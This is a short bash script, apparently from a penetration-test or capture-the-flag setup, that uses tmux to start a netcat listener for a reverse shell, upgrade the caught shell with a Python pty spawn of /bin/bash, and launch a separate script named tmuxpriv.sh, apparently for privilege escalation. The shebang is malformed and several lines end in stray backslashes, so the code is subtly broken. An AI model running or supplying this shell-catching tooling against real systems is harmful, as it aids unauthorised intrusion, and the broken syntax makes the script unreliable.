#/bin/bash
tmux send-keys -t GG.0 "nc -lnvp 1234"
sleep 20\
tmux send-keys -t GG.0 'python3 -c "import pty; pty.spawn('\
tmux send-keys -t GG.0 "'/bin/bash')"\
tmux send-keys -t GG.0 '"' ENTER\
tmux new -d -s PRIV
sleep 20\
tmux send-keys -t PRIV.0 "./tmuxpriv.sh"
# http://man7.org/linux/man-pages/man1/tmux.1.html
